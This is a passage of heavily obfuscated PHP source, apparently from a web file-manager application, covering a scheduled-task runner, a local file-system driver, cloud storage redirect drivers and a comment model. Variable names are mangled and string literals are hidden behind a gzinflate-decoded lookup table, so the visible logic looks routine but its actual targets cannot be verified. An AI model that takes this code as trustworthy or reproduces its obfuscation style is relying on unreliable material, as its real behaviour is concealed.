self::valueGet($ó°“³¨¶[833]) == $ó°“³¨¶[91] ? $ó°“³¨¶[228] : $ó°“³¨¶[91]; self::valueSet($ó°“³¨¶[833], $ÆÙâ›–); } public static function shutdownEvent() { $şÅúê½Ò =& $_SERVER[²Ö÷öõ]; self::valueSet($şÅúê½Ò[1730], $şÅúê½Ò[228]); self::log($şÅúê½Ò[1748]); } public static function config($‚œì›, $Õ²×•±–) { self::valueSet($_SERVER[²Ö÷öõ][833], $‚œì›); } private static function taskRunAll() { $Åˆ ¥˜ =& $_SERVER[²Ö÷öõ]; $áÁıÌ = timeFloat(); $ÁºËåŞ‘ = Model($Åˆ ¥˜[1749])->listData(); $™·ë‚äú = count($ÁºËåŞ‘); for ($â¢ƒèèñ = 0; $â¢ƒèèñ < $™·ë‚äú; $â¢ƒèèñ++) { $›ıá¨œ = $ÁºËåŞ‘[$â¢ƒèèñ]; if (!$›ıá¨œ[$Åˆ ¥˜[475]] || $›ıá¨œ[$Åˆ ¥˜[1750]] != $Åˆ ¥˜[91]) { continue; } if (!self::taskTimeCheck($›ıá¨œ)) { continue; } self::taskRun($›ıá¨œ); } Hook::trigger($Åˆ ¥˜[1751]); self::taskQueueRun($áÁıÌ); } private static function taskQueueRun($¶±§Ÿı´) { $ã’‚œ÷­ = 10; while (!0) { $ãÜ‡‹€ú = TaskQueue::run(); if ($ãÜ‡‹€ú === !1) { break; } if (timeFloat() - $¶±§Ÿı´ >= $ã’‚œ÷­) { break; } } } private static function taskTimeCheck($àä“Šå) { $Ñæışå– =& $_SERVER[²Ö÷öõ]; $õÃµÛÄ¸ = json_decode($àä“Šå[$Ñæışå–[206]], !0); $±§œ÷ƒÂ = intval($àä“Šå[$Ñæışå–[1731]]); $¨œ¸ÅÊÎ = strtotime($Ñæışå–[1752] . $õÃµÛÄ¸[$Ñæışå–[1753]] . $Ñæışå–[1754]) - strtotime($Ñæışå–[1755]); $øØô–” = time() - strtotime(date($Ñæışå–[1756]) . $Ñæışå–[1757]); $‚‚°”½ì = $øØô–” >= $¨œ¸ÅÊÎ && $øØô–” <= $¨œ¸ÅÊÎ + 3600; switch ($õÃµÛÄ¸[$Ñæışå–[33]]) { case $Ñæışå–[1758]: if (time() - $±§œ÷ƒÂ < 3600 * 24 * 30) { return !1; } if ($õÃµÛÄ¸[$Ñæışå–[1758]] == date($Ñæışå–[1759]) && $‚‚°”½ì) { return !0; } break; case $Ñæışå–[1760]: if (time() - $±§œ÷ƒÂ < 3600 * 24 * 7) { return !1; } $í÷”‡àÍ = date($Ñæışå–[1761]) == 0 ? 7 : date($Ñæışå–[1761]); if ($õÃµÛÄ¸[$Ñæışå–[1760]] == $í÷”‡àÍ && $‚‚°”½ì) { return !0; } break; case $Ñæışå–[1753]: if (time() - $±§œ÷ƒÂ < 3600 * 24) { return !1; } if ($‚‚°”½ì) { return !0; } break; case $Ñæışå–[1762]: if (time() - $±§œ÷ƒÂ >= floatval($õÃµÛÄ¸[$Ñæışå–[1762]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $¨âç¦Ü‚ =& $_SERVER[²Ö÷öõ]; static $Û¤Öö±€ = 0; $ê‡ñİÇ = 300; if (!$Û¤Öö±€) { $Û¤Öö±€ = time(); } if (time() - $Û¤Öö±€ < $ê‡ñİÇ) { return; } $Û¤Öö±€ = time(); $äÂ’¾äÓ = Model($¨âç¦Ü‚[577])->db($¨âç¦Ü‚[12]); if ($äÂ’¾äÓ) { $äÂ’¾äÓ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($¨âç¦Ü‚[1763], $¨âç¦Ü‚[1764]); die; } } public static function taskRun($¢á´©ã®) { $œî§ûı½ =& $_SERVER[²Ö÷öõ]; self::log($œî§ûı½[1765] . $¢á´©ã®[$œî§ûı½[475]] . $œî§ûı½[1766] . $¢á´©ã®[$œî§ûı½[32]] . $œî§ûı½[1767] . $¢á´©ã®[$œî§ûı½[1768]]); Model($œî§ûı½[1749])->run($¢á´©ã®[$œî§ûı½[475]]); $è¿îÈ¥ = timeFloat(); $½·æ“™§ = $œî§ûı½[12]; switch ($¢á´©ã®[$œî§ûı½[33]]) { case $œî§ûı½[383]: $¨­ı„”ƒ = url_request($¢á´©ã®[$œî§ûı½[1768]], $œî§ûı½[261], !1, !1, !1, !1, 10); if ($¨­ı„”ƒ[$œî§ûı½[833]]) { $½·æ“™§ = strlen($¨­ı„”ƒ[$œî§ûı½[1295]]); } break; case $œî§ûı½[260]: $½·æ“™§ = Hook::apply($¢á´©ã®[$œî§ûı½[1768]]); default: break; } Model($œî§ûı½[1769])->add(array($œî§ûı½[1770] => $œî§ûı½[12], $œî§ûı½[1771] => $œî§ûı½[228], $œî§ûı½[33] => $œî§ûı½[1772] . $¢á´©ã®[$œî§ûı½[475]], $œî§ûı½[1773] => json_encode(array($œî§ûı½[32] => $¢á´©ã®[$œî§ûı½[32]], $œî§ûı½[1774] => timeFloat() - $è¿îÈ¥, $œî§ûı½[369] => $½·æ“™§)))); $ŠÍ¤²µ´ = $½·æ“™§ ? $œî§ûı½[1775] . $½·æ“™§ : $œî§ûı½[12]; self::log($œî§ûı½[1776] . $¢á´©ã®[$œî§ûı½[475]] . $œî§ûı½[178] . $ŠÍ¤²µ´); return !0; } public static function valueGet($÷–ÁèíÌ) { $ïÖÊÑìä =& $_SERVER[²Ö÷öõ]; $…‡•öÃ¬ = $ïÖÊÑìä[1777]; $ùç ¡‘ä = Model($ïÖÊÑìä[508])->get($÷–ÁèíÌ, $…‡•öÃ¬); if (is_null($ùç ¡‘ä)) { Model($ïÖÊÑìä[508])->set($ïÖÊÑìä[833], $ïÖÊÑìä[91], $…‡•öÃ¬); Model($ïÖÊÑìä[508])->set($ïÖÊÑìä[1730], $ïÖÊÑìä[228], $…‡•öÃ¬); $ùç ¡‘ä = Model($ïÖÊÑìä[508])->get($÷–ÁèíÌ, $…‡•öÃ¬); } return $ùç ¡‘ä; } private static function valueSet($ºÅ½ˆşö, $¹¥¡ÍçÔ = false) { $Ú¹¿¥³… =& $_SERVER[²Ö÷öõ]; $ìƒ­…Á = $Ú¹¿¥³…[1778]; CacheLock::lock($ìƒ­…Á); $äÌ±ƒ„Ú = Model($Ú¹¿¥³…[508])->set($ºÅ½ˆşö, $¹¥¡ÍçÔ, $Ú¹¿¥³…[1777]); CacheLock::unlock($ìƒ­…Á); return $äÌ±ƒ„Ú; } protected static function log($Ì˜Õ©’) { write_log($Ì˜Õ©’, $_SERVER[²Ö÷öõ][1764]); } private static function cacheClear() { $ğ®¦‚§ =& $_SERVER[²Ö÷öõ]; Cache::clearMemory(Model($ğ®¦‚§[508])->cacheKey($ğ®¦‚§[1777])); Cache::clearMemory(Model($ğ®¦‚§[508])->cacheKey($ğ®¦‚§[1779])); Model($ğ®¦‚§[1749])->cacheClear(); self::closeDatabase(); } } goto d¨±Œì‡”Ì; Dã‚›ÍíÒ±: define($_SERVER[²Ö÷öõ][0], $_SERVER[²Ö÷öõ][1]); $_SERVER[ÙÓõçÄİ] = explode($_SERVER[²Ö÷öõ][2], gzinflate(substr($_SERVER[²Ö÷öõ][3], 10, -8))); function binCheckEq($°´Ì‘™À, $ç¨ˆãÍŒ) { return $°´Ì‘™À == $ç¨ˆãÍŒ; } goto dÄêÃ°Ê¾ë; DÅ§³á÷Íì: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($Ô•±õĞƒ) { if (substr($Ô•±õĞƒ, 0, 2) == $_SERVER[²Ö÷öõ][1420]) { $Ô•±õĞƒ = BASIC_PATH . substr($Ô•±õĞƒ, 2); } return $Ô•±õĞƒ; } public function iconvApp($•æÉƒĞ€) { $Ş¶²Ë¡’ =& $_SERVER[²Ö÷öõ]; global $config; return $this->iconvTo($•æÉƒĞ€, $config[$Ş¶²Ë¡’[1447]], $config[$Ş¶²Ë¡’[1446]]); } public function iconvSystem($Á‚¤¸òş) { $â„…§Ó° =& $_SERVER[²Ö÷öõ]; global $config; return $this->iconvTo($Á‚¤¸òş, $config[$â„…§Ó°[1446]], $config[$â„…§Ó°[1447]]); } public function getPathOuter($ÌÌÂ°ïá) { $Ì¯íÖò =& $_SERVER[²Ö÷öõ]; $Ùœ•ù¸¾ = $this->iconvApp($this->pathBase); $ÌÌÂ°ïá = $this->iconvApp($ÌÌÂ°ïá); if (substr($Ùœ•ù¸¾, 0, 2) == $Ì¯íÖò[1420]) { $Ùœ•ù¸¾ = BASIC_PATH . substr($Ùœ•ù¸¾, 2); } if (substr($ÌÌÂ°ïá, 0, 2) == $Ì¯íÖò[1420]) { $ÌÌÂ°ïá = BASIC_PATH . substr($ÌÌÂ°ïá, 2); } $Ùœ•ù¸¾ = KodIO::clear($Ùœ•ù¸¾); $ÌÌÂ°ïá = KodIO::clear($ÌÌÂ°ïá); $ÌÌÂ°ïá = substr($ÌÌÂ°ïá, strlen($Ùœ•ù¸¾)); if (empty($this->pathDriver)) { return $ÌÌÂ°ïá; } return $this->pathDriver . $Ì¯íÖò[8] . ltrim($ÌÌÂ°ïá, $Ì¯íÖò[8]); } public function mkfile($“³„¾Õ, $şˆÛÏ€Ì = '', $²üı²¡Ô = REPEAT_RENAME) { $“³„¾Õ = $this->iconvSystem($“³„¾Õ); @touch($“³„¾Õ); if ($şˆÛÏ€Ì) { file_put_contents($“³„¾Õ, $şˆÛÏ€Ì); } @chmod($“³„¾Õ, $this->pathAuth); if (is_file($“³„¾Õ)) { return $this->getPathOuter($“³„¾Õ); } $this->writeLog(__FUNCTION__ . $_SERVER[²Ö÷öõ][1458], !0); return !1; } public function mkdir($¬ŸÄÄÔÃ, $ÛÎ¿¥„Ö = REPEAT_SKIP) { $¬ŸÄÄÔÃ = $this->iconvSystem($¬ŸÄÄÔÃ); if (is_dir($¬ŸÄÄÔÃ)) { return $this->getPathOuter($¬ŸÄÄÔÃ); } @mkdir($¬ŸÄÄÔÃ, $this->pathAuth, !0); @chmod($¬ŸÄÄÔÃ, $this->pathAuth); if (is_dir($¬ŸÄÄÔÃ)) { return $this->getPathOuter($¬ŸÄÄÔÃ); } $this->writeLog(__FUNCTION__ . $_SERVER[²Ö÷öõ][1458], !0); return !1; } public function copyFile($˜‡üÆÄ™, $¥ßÎÖ’€) { $this->mkdir($this->pathFather($¥ßÎÖ’€)); $˜‡üÆÄ™ = $this->iconvSystem($˜‡üÆÄ™); $¥ßÎÖ’€ = $this->iconvSystem($¥ßÎÖ’€); $Ÿ†Ç‚¯» = copy_64($˜‡üÆÄ™, $¥ßÎÖ’€); @chmod($¥ßÎÖ’€, $this->pathAuth); if ($Ÿ†Ç‚¯») { return $this->getPathOuter($¥ßÎÖ’€); } $this->writeLog(__FUNCTION__ . $_SERVER[²Ö÷öõ][1458], !0); return !1; } public function moveFile($ŒÅšØÂÉ, $ŞÕÑö·¾) { $this->mkdir($this->pathFather($ŞÕÑö·¾)); $ŒÅšØÂÉ = $this->iconvSystem($ŒÅšØÂÉ); $ŞÕÑö·¾ = $this->iconvSystem($ŞÕÑö·¾); $æ›¢£è = intval(@rename($ŒÅšØÂÉ, $ŞÕÑö·¾)); if (!$æ›¢£è) { if ($æ›¢£è = intval(@copy_64($ŒÅšØÂÉ, $ŞÕÑö·¾))) { @unlink($ŒÅšØÂÉ); } } @chmod($ŞÕÑö·¾, $this->pathAuth); if ($æ›¢£è) { return $this->getPathOuter($ŞÕÑö·¾); } $this->writeLog(__FUNCTION__ . $_SERVER[²Ö÷öõ][1458], !0); return !1; } public function movePath($Õ„ôâº, $´œîĞá£, $¾Ë­‰ù³ = false) { $İ¹ÄËŞÄ =& $_SERVER[²Ö÷öõ]; $Õ„ôâº = $this->iconvSystem($Õ„ôâº); $´œîĞá£ = $this->iconvSystem($´œîĞá£); $«©†êµï = rtrim($´œîĞá£, $İ¹ÄËŞÄ[8]) . $İ¹ÄËŞÄ[8] . ($¾Ë­‰ù³ ? $¾Ë­‰ù³ : get_path_this($Õ„ôâº)); if (file_exists($«©†êµï)) { return !1; } $íñ¹ºÔ = intval(@rename($Õ„ôâº, $«©†êµï)); $íñ¹ºÔ = file_exists($«©†êµï); if ($íñ¹ºÔ) { return $this->getPathOuter($«©†êµï); } $this->writeLog(__FUNCTION__ . $İ¹ÄËŞÄ[1458], !0); return !1; } public function delFile($âÉ»ä¼¹) { $âÉ»ä¼¹ = $this->iconvSystem($âÉ»ä¼¹); if (!@unlink($âÉ»ä¼¹)) { @chmod($âÉ»ä¼¹, $this->pathAuth); if (@unlink($âÉ»ä¼¹)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[²Ö÷öõ][1458], !0); return !1; } return !0; } public function delFolder($”ùùÈÕ) { $¢óÏ¸ëÀ =& $_SERVER[²Ö÷öõ]; $”ùùÈÕ = $this->iconvSystem($”ùùÈÕ); if (!is_dir($”ùùÈÕ)) { return !0; } if (!($çëäÃƒ = opendir($”ùùÈÕ))) { return !1; } while (($Û´„Ş¾½ = readdir($çëäÃƒ)) !== !1) { if ($Û´„Ş¾½ == $¢óÏ¸ëÀ[10] || $Û´„Ş¾½ == $¢óÏ¸ëÀ[1373]) { continue; } $ñæğ²ßÁ = $”ùùÈÕ . $¢óÏ¸ëÀ[8] . $Û´„Ş¾½; if (is_file($ñæğ²ßÁ) || is_link($ñæğ²ßÁ)) { if (!unlink($ñæğ²ßÁ)) { chmod($ñæğ²ßÁ, $this->pathAuth); if (!unlink($ñæğ²ßÁ)) { return !1; } } } else { if (is_dir($ñæğ²ßÁ)) { chmod($ñæğ²ßÁ, $this->pathAuth); $ñæğ²ßÁ = $this->iconvApp($ñæğ²ßÁ); if (!$this->delFolder($ñæğ²ßÁ)) { return !1; } } } } closedir($çëäÃƒ); return rmdir($”ùùÈÕ); } public function rename($‹ÉÈ®Ëµ, $ÃËŒ¯§½) { $ªĞëöáâ =& $_SERVER[²Ö÷öõ]; $¨‰™À™Ê = $this->fileNameAuto($this->pathFather($‹ÉÈ®Ëµ), $ÃËŒ¯§½); $¨‰™À™Ê = $this->iconvSystem($¨‰™À™Ê); $‹ÉÈ®Ëµ = $this->iconvSystem($‹ÉÈ®Ëµ); $”“øùæÕ = $this->pathFather($‹ÉÈ®Ëµ); $Ğ§ğşğ™ = rtrim($”“øùæÕ, $ªĞëöáâ[8]) . $ªĞëöáâ[8] . $¨‰™À™Ê; $ú¸×“ƒÏ = @rename($‹ÉÈ®Ëµ, $Ğ§ğşğ™); $Ğ§ğşğ™ = $this->iconvApp($Ğ§ğşğ™); if ($ú¸×“ƒÏ) { return $this->getPathOuter($Ğ§ğşğ™); } $this->writeLog(__FUNCTION__ . $ªĞëöáâ[1458], !0); return !1; } public function size($¨›ª¥¯å) { $¨›ª¥¯å = $this->iconvSystem($¨›ª¥¯å); return filesize_64($¨›ª¥¯å); } public function info($Ä§İ™± ) { $Ä§İ™±  = $this->iconvSystem($Ä§İ™± ); if ($this->isFolder($Ä§İ™± )) { return $this->folderInfo($Ä§İ™± ); } else { if ($this->isFile($Ä§İ™± )) { return $this->fileInfo($Ä§İ™± ); } } return !1; } protected function infoChildren($˜ÉË£ø’, &$®Ûå¯˜ı, $ Òã¯½ê = true) { $“¨¦ËØâ =& $_SERVER[²Ö÷öõ]; check_abort_echo(); $˜ÉË£ø’ = rtrim($˜ÉË£ø’, $“¨¦ËØâ[8]) . $“¨¦ËØâ[8]; if ($ Òã¯½ê) { $˜ÉË£ø’ = $this->iconvSystem($˜ÉË£ø’); } if (!($¿û¢±ôì = @opendir($˜ÉË£ø’))) { return; } while (($‰˜á†·Ş = readdir($¿û¢±ôì)) !== !1) { if ($‰˜á†·Ş == $“¨¦ËØâ[10] || $‰˜á†·Ş == $“¨¦ËØâ[1373]) { continue; } $§ Š¼ÃÖ = $˜ÉË£ø’ . $‰˜á†·Ş; if (is_file($§ Š¼ÃÖ) || is_link($§ Š¼ÃÖ)) { $®Ûå¯˜ı[$“¨¦ËØâ[80]]++; $®Ûå¯˜ı[$“¨¦ËØâ[79]] += filesize_64($§ Š¼ÃÖ); } else { if (is_dir($§ Š¼ÃÖ)) { $®Ûå¯˜ı[$“¨¦ËØâ[81]]++; $this->infoChildren($§ Š¼ÃÖ, $®Ûå¯˜ı, !1); } } } closedir($¿û¢±ôì); } private function folderInfo($ò±ÚÅÃ¾, $ÌÈ…å¦’ = false) { $±½Áò‹¢ =& $_SERVER[²Ö÷öõ]; $ò±ÚÅÃ¾ = rtrim($ò±ÚÅÃ¾, $±½Áò‹¢[8]) . $±½Áò‹¢[8]; $© ı²Ôƒ = $this->iconvApp($this->pathThis($ò±ÚÅÃ¾)); if ($ÌÈ…å¦’) { return array($±½Áò‹¢[32] => $© ı²Ôƒ, $±½Áò‹¢[87] => $this->getPathOuter($ò±ÚÅÃ¾), $±½Áò‹¢[33] => $±½Áò‹¢[78]); } $£Ê•Òå = array($±½Áò‹¢[32] => $© ı²Ôƒ, $±½Áò‹¢[87] => $this->getPathOuter($ò±ÚÅÃ¾), $±½Áò‹¢[33] => $±½Áò‹¢[78], $±½Áò‹¢[231] => @filectime($ò±ÚÅÃ¾), $±½Áò‹¢[88] => @filemtime($ò±ÚÅÃ¾), $±½Áò‹¢[1462] => @fileatime($ò±ÚÅÃ¾), $±½Áò‹¢[1463] => is_readable($ò±ÚÅÃ¾), $±½Áò‹¢[1464] => is_writable($ò±ÚÅÃ¾), $±½Áò‹¢[1465] => get_mode($ò±ÚÅÃ¾)); return $£Ê•Òå; } private function fileInfo($‡ÈùşâÙ, $ô³ª¯›Á = false) { $Ì¦«×ë =& $_SERVER[²Ö÷öõ]; $Ğ¹–êşê = $this->iconvApp($this->pathThis($‡ÈùşâÙ)); if ($ô³ª¯›Á) { return array($Ì¦«×ë[32] => $Ğ¹–êşê, $Ì¦«×ë[87] => $this->getPathOuter($‡ÈùşâÙ), $Ì¦«×ë[33] => $Ì¦«×ë[230], $Ì¦«×ë[79] => $this->size($‡ÈùşâÙ), $Ì¦«×ë[169] => $this->ext($Ğ¹–êşê)); } $í™ ¤¸ = array($Ì¦«×ë[32] => $Ğ¹–êşê, $Ì¦«×ë[87] => $this->getPathOuter($‡ÈùşâÙ), $Ì¦«×ë[33] => $Ì¦«×ë[230], $Ì¦«×ë[231] => @filectime($‡ÈùşâÙ), $Ì¦«×ë[88] => @filemtime($‡ÈùşâÙ), $Ì¦«×ë[1462] => @fileatime($‡ÈùşâÙ), $Ì¦«×ë[79] => $this->size($‡ÈùşâÙ), $Ì¦«×ë[169] => $this->ext($Ğ¹–êşê), $Ì¦«×ë[1463] => is_readable($‡ÈùşâÙ), $Ì¦«×ë[1464] => is_writable($‡ÈùşâÙ), $Ì¦«×ë[1465] => get_mode($‡ÈùşâÙ)); return $í™ ¤¸; } public function exist($Ò‡ú‘ÆÔ) { $Ò‡ú‘ÆÔ = $this->iconvSystem($Ò‡ú‘ÆÔ); return @file_exists($Ò‡ú‘ÆÔ); } public function isFile($ê»±†©Á) { $ê»±†©Á = $this->iconvSystem($ê»±†©Á); return @is_file($ê»±†©Á); } public function isFolder($“Ëç¼) { $“Ëç¼ = $this->iconvSystem($“Ëç¼); return @is_dir($“Ëç¼); } public function listPath($—–Êš¡Ÿ, $¶Ì£ç˜ß = false) { $Íİùë°Â =& $_SERVER[²Ö÷öõ]; $—–Êš¡Ÿ = $this->iconvSystem($—–Êš¡Ÿ); $—–Êš¡Ÿ = rtrim($—–Êš¡Ÿ, $Íİùë°Â[8]) . $Íİùë°Â[8]; $‘¤Áßõ = array($Íİùë°Â[85] => array(), $Íİùë°Â[86] => array()); if (!($óùÌÙŞ = @opendir($—–Êš¡Ÿ))) { return $‘¤Áßõ; } while (($¢Æİëû = readdir($óùÌÙŞ)) !== !1) { if ($¢Æİëû == $Íİùë°Â[10] || $¢Æİëû == $Íİùë°Â[1373]) { continue; } $ë²‚“Õ‡ = $—–Êš¡Ÿ . $¢Æİëû; if (is_file($ë²‚“Õ‡)) { $‘¤Áßõ[$Íİùë°Â[86]][] = $this->fileInfo($ë²‚“Õ‡, $¶Ì£ç˜ß); } else { $‘¤Áßõ[$Íİùë°Â[85]][] = $this->folderInfo($ë²‚“Õ‡, $¶Ì£ç˜ß); } } closedir($óùÌÙŞ); return $‘¤Áßõ; } public function listAll($ŸÜŸûå‰, &$˜Å—ˆ­ª = array()) { $¢™¾ğûŞ =& $_SERVER[²Ö÷öõ]; $ŸÜŸûå‰ = $this->iconvSystem($ŸÜŸûå‰); $ŸÜŸûå‰ = rtrim($ŸÜŸûå‰, $¢™¾ğûŞ[8]) . $¢™¾ğûŞ[8]; if (!($ú›³¢ü = @opendir($ŸÜŸûå‰))) { return $˜Å—ˆ­ª; } while (($ù÷éÜàÏ = readdir($ú›³¢ü)) !== !1) { if ($ù÷éÜàÏ == $¢™¾ğûŞ[10] || $ù÷éÜàÏ == $¢™¾ğûŞ[1373]) { continue; } $º®î¨ = $ŸÜŸûå‰ . $ù÷éÜàÏ; $Ôø¢›üë = is_dir($º®î¨) && !is_link($º®î¨) ? 1 : 0; $º®î¨ = $Ôø¢›üë ? $º®î¨ . $¢™¾ğûŞ[8] : $º®î¨; $˜Å—ˆ­ª[] = array($¢™¾ğûŞ[87] => $º®î¨, $¢™¾ğûŞ[78] => $Ôø¢›üë, $¢™¾ğûŞ[88] => intval(@filemtime($º®î¨)), $¢™¾ğûŞ[79] => $Ôø¢›üë ? 0 : intval($this->size($º®î¨))); if ($Ôø¢›üë) { $this->listAll($º®î¨, $˜Å—ˆ­ª); } } closedir($ú›³¢ü); return $˜Å—ˆ­ª; } public function has($Œê¡¤Â, $¿Õ‰£†» = false, $–€”²öŸ = true) { $¢¦Ì¡©” =& $_SERVER[²Ö÷öõ]; $Œê¡¤Â = $this->iconvSystem($Œê¡¤Â); $Œê¡¤Â = rtrim($Œê¡¤Â, $¢¦Ì¡©”[8]) . $¢¦Ì¡©”[8]; if (!($®åˆÂ˜ = @opendir($Œê¡¤Â))) { return !1; } $ê˜üßÑ† = 0; $îù¨Ìöœ = 0; $Æãçç¸ = 0; while (($»Œ©ª¤² = readdir($®åˆÂ˜)) !== !1) { if ($»Œ©ª¤² == $¢¦Ì¡©”[10] || $»Œ©ª¤² == $¢¦Ì¡©”[1373]) { continue; } $äßÜáÄî = $Œê¡¤Â . $»Œ©ª¤²; if ($¿Õ‰£†») { $Æãçç¸++; if (@is_file($äßÜáÄî)) { $ê˜üßÑ†++; } else { $îù¨Ìöœ++; } if ($Æãçç¸ > 10000) { break; } continue; } if ($–€”²öŸ) { if (@is_file($äßÜáÄî)) { return !0; } } else { if (@is_dir($äßÜáÄî . $¢¦Ì¡©”[8])) { return !0; } } } closedir($®åˆÂ˜); if ($¿Õ‰£†») { return array($¢¦Ì¡©”[239] => $ê˜üßÑ†, $¢¦Ì¡©”[240] => $îù¨Ìöœ); } return !1; } public function hashSimple($’û¦…ÔÛ) { $ÆÁÏÒíÆ =& $_SERVER[²Ö÷öõ]; if (!$’û¦…ÔÛ) { return md5($ÆÁÏÒíÆ[12]); } $’û¦…ÔÛ = $this->iconvSystem($’û¦…ÔÛ); $Ûí¯µ = $this->size($’û¦…ÔÛ); $ƒ‹Ãë— = 200; $¸à©‘ £ = 50; if ($Ûí¯µ <= $ƒ‹Ãë— * $¸à©‘ £) { return $this->hashMd5($’û¦…ÔÛ) . $Ûí¯µ; } $ºã¬áœ = $ÆÁÏÒíÆ[12]; $¼ÇéÌ“ = intval($Ûí¯µ / $¸à©‘ £); $üöÓø´Ğ = fopen($’û¦…ÔÛ, $ÆÁÏÒíÆ[1466]); if (!$üöÓø´Ğ) { return $ºã¬áœ; } for ($€ŞÏ¸²š = 0; $€ŞÏ¸²š < $¸à©‘ £; $€ŞÏ¸²š++) { fseek_64($üöÓø´Ğ, $¼ÇéÌ“ * $€ŞÏ¸²š); $ºã¬áœ .= fread($üöÓø´Ğ, $ƒ‹Ãë—); } fseek_64($üöÓø´Ğ, $Ûí¯µ - $ƒ‹Ãë—); $ºã¬áœ .= fread($üöÓø´Ğ, $ƒ‹Ãë—); fclose($üöÓø´Ğ); return md5($ºã¬áœ) . $Ûí¯µ; } public function getContent($ƒ‹“ëñ) { $ƒ‹“ëñ = $this->iconvSystem($ƒ‹“ëñ); return file_get_contents($ƒ‹“ëñ); } public function setContent($ìò¢ÉçÔ, $ÕÌú°ö = '') { $ìò¢ÉçÔ = $this->iconvSystem($ìò¢ÉçÔ); $å“·´¦ = @file_put_contents($ìò¢ÉçÔ, $ÕÌú°ö, LOCK_EX); if (!$å“·´¦) { $this->writeLog(__FUNCTION__ . $_SERVER[²Ö÷öõ][1458], !0); } clearstatcache(); @chmod($ìò¢ÉçÔ, $this->pathAuth); return $å“·´¦ === !1 ? !1 : !0; } public function fileSubstr($§ºÍêó, $ÔÌŠÜ” = 0, $Ô£¿“öÙ = false) { $¿¯¾¾¯† =& $_SERVER[²Ö÷öõ]; $§ºÍêó = $this->iconvSystem($§ºÍêó); if ($Ô£¿“öÙ === !1) { $Ô£¿“öÙ = $this->size($§ºÍêó); } if ($Ô£¿“öÙ <= 0) { return $¿¯¾¾¯†[12]; } $üüÂµŸö = fopen($§ºÍêó, $¿¯¾¾¯†[1466]); if (!$üüÂµŸö) { return !1; } fseek_64($üüÂµŸö, $ÔÌŠÜ”); $„¯ëŠêö = fread($üüÂµŸö, $Ô£¿“öÙ); fclose($üüÂµŸö); if (!$„¯ëŠêö) { $this->writeLog(__FUNCTION__ . $¿¯¾¾¯†[1458], !0); } return $„¯ëŠêö; } public function upload($Áƒâ†ûË, $·¶…ƒÚá, $­–Şâè = false, $³³«®á¸ = REPEAT_REPLACE) { if ($­–Şâè) { return $this->moveFile($·¶…ƒÚá, $Áƒâ†ûË); } return $this->copyFile($·¶…ƒÚá, $Áƒâ†ûË); } public function setModifyTime($ËïåìµÅ, $ó×’õ¾à = '') { @touch($ËïåìµÅ, intval($ó×’õ¾à)); } public function download($¬èÚæ¬ù, $Åª…‚Ò€) { return $this->iconvSystem($¬èÚæ¬ù); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($¶ãË±Æ¢) { parent::__construct($¶ãË±Æ¢); $this->setSignVersion($_SERVER[²Ö÷öõ][247]); } public function fileOutImage($‚™¼Ü¨‰, $‡¤ƒÑŞ× = 250) { $Ö¼‘ é² =& $_SERVER[²Ö÷öõ]; if ($this->size($‚™¼Ü¨‰) > 1024 * 1024 * 25) { return $this->fileOutImageServer($‚™¼Ü¨‰, $‡¤ƒÑŞ×); } $°Ë­µó = array($Ö¼‘ é²[1467] => $Ö¼‘ é²[1468] . $‡¤ƒÑŞ× . $Ö¼‘ é²[1469]); $¹¤İÎĞ± = $this->link($‚™¼Ü¨‰, $°Ë­µó); $this->fileOutLink($¹¤İÎĞ±); } public function fileOutLink($Äé¦±‘œ) { $Üèä ò¼ =& $_SERVER[²Ö÷öõ]; if (substr($Äé¦±‘œ, 0, 7) == $Üèä ò¼[313]) { $Äé¦±‘œ = $Üèä ò¼[314] . substr($Äé¦±‘œ, 7); } header($Üèä ò¼[175] . $Äé¦±‘œ); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($§¹™ú×) { parent::__construct($§¹™ú×); $this->setSignVersion($_SERVER[²Ö÷öõ][247]); } public function fileOutLink($Óöîåóº) { $áÌ›• =& $_SERVER[²Ö÷öõ]; if (substr($Óöîåóº, 0, 7) == $áÌ›•[313]) { $Óöîåóº = $áÌ›•[314] . substr($Óöîåóº, 7); } header($áÌ›•[175] . $Óöîåóº); die; } } goto BÚÁÜÉˆ; BŠ¾•ùù»: class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\x6d\x65\x6e\x74"; protected $tableMeta = array("\164\141\x62\154\x65\x4e\141\155\145" => "\x63\x6f\155\155\x65\156\x74\137\x6d\x65\x74\x61", "\x6d\145\x74\x61\106\151\145\154\144" => "\x63\x6f\x6d\155\x65\156\x74\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ŒÃµÕ‚) { $¡Äúäˆ‡ =& $_SERVER[²Ö÷öõ]; if ($ŒÃµÕ‚[$¡Äúäˆ‡[2009]]) { $§‰ÀÑ› = $this->where(array($¡Äúäˆ‡[2010] => $ŒÃµÕ‚[$¡Äúäˆ‡[2009]]))->find(); if (!$§‰ÀÑ› || $§‰ÀÑ›[$¡Äúäˆ‡[190]] != $ŒÃµÕ‚[$¡Äúäˆ‡[190]] || $§‰ÀÑ›[$¡Äúäˆ‡[569]] != $ŒÃµÕ‚[$¡Äúäˆ‡[569]]) { return !1; } $this->where(array($¡Äúäˆ‡[2010] => $ŒÃµÕ‚[$¡Äúäˆ‡[2009]]))->setAdd($¡Äúäˆ‡[2011], 1); } $ŒÃµÕ‚[$¡Äúäˆ‡[2012]] = 0; $ŒÃµÕ‚[$¡Äúäˆ‡[2011]] = 0; $ŒÃµÕ‚[$¡Äúäˆ‡[833]] = 1; return $this->add($ŒÃµÕ‚); } public function commentCount($„ö„™¾, $ŒËè•áñ, $çØáØ©… = false) { $ã³óô×à =& $_SERVER[²Ö÷öõ]; if (!$„ö„™¾) { return array(); } if (is_string($„ö„™¾) || is_int($„ö„™¾)) { $„ö„™¾ = array($„ö„™¾); } $õâùˆ“ = array($ã³óô×à[569], $ã³óô×à[2013] => $ã³óô×à[565]); $×›ƒÅÑò = array($ã³óô×à[569] => array($ã³óô×à[7], $„ö„™¾), $ã³óô×à[190] => 